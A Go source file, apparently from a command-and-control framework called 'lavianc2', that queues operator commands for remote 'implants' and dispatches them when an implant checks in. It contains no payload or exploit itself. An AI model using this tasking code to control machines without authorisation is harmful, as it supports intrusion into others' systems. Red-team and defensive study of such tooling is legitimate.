package tasks

import (
	"context"
	"errors"
	"log/slog"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/uLl0a/lavianc2/internal/events"
	"github.com/uLl0a/lavianc2/internal/models"
	"github.com/uLl0a/lavianc2/internal/storage"
)

// Engine gestiona el ciclo de vida completo de las tareas.
type Engine struct {
	store    *storage.Store
	registry SessionRegistry
	bus      *events.Bus
	log      *slog.Logger

	mu       sync.RWMutex
	inFlight map[uuid.UUID]struct{}
}

type SessionRegistry interface {
	IsOnline(implantID uuid.UUID) bool
	NotifyPendingTask(ctx context.Context, implantID, taskID uuid.UUID) error
}

func NewEngine(store *storage.Store, reg SessionRegistry, bus *events.Bus, log *slog.Logger) *Engine {
	e := &Engine{
		store:    store,
		registry: reg,
		bus:      bus,
		log:      log,
		inFlight: make(map[uuid.UUID]struct{}),
	}
	bus.Subscribe(events.TopicImplantCheckin, e.onImplantCheckin)
	bus.Subscribe(events.TopicTaskCompleted, e.onTaskCompleted)
	return e
}

// Submit encola una tarea y notifica si el implante está online.
func (e *Engine) Submit(ctx context.Context, t *models.Task) error {
	if t.Command == "" {
		return errors.New("tasks: comando vacío")
	}
	if t.ImplantID == uuid.Nil {
		return errors.New("tasks: implant_id requerido")
	}
	t.Status = models.TaskPending
	t.CreatedAt = time.Now().UTC()
	if err := e.store.Tasks.CreateTask(ctx, t); err != nil {
		return err
	}

	e.bus.Publish(ctx, events.Event{
		Topic:   events.TopicTaskCreated,
		Payload: t,
	})

	// Si el implante está online, notificamos inmediatamente.
	if e.registry.IsOnline(t.ImplantID) {
		if err := e.registry.NotifyPendingTask(ctx, t.ImplantID, t.ID); err != nil {
			e.log.Warn("no se pudo notificar tarea online", "err", err, "task", t.ID)
		}
	}
	return nil
}

// onImplantCheckin despacha tareas pendientes cuando un implante vuelve.
func (e *Engine) onImplantCheckin(ctx context.Context, ev events.Event) {
	implantID, ok := ev.Payload.(uuid.UUID)
	if !ok {
		return
	}
	tasks, err := e.store.Tasks.ClaimPendingTasksForImplant(ctx, implantID, 32)
	if err != nil {
		e.log.Error("error listando tareas pendientes", "err", err, "implant", implantID)
		return
	}
	for _, t := range tasks {
		if err := e.registry.NotifyPendingTask(ctx, implantID, t.ID); err != nil {
			e.log.Warn("no se pudo notificar tarea", "err", err, "task", t.ID)
		}
	}
}

func (e *Engine) onTaskCompleted(ctx context.Context, ev events.Event) {
	data, ok := ev.Payload.(map[string]any)
	if !ok {
		return
	}
	taskID, _ := data["task_id"].(uuid.UUID)
	e.mu.Lock()
	delete(e.inFlight, taskID)
	e.mu.Unlock()
}
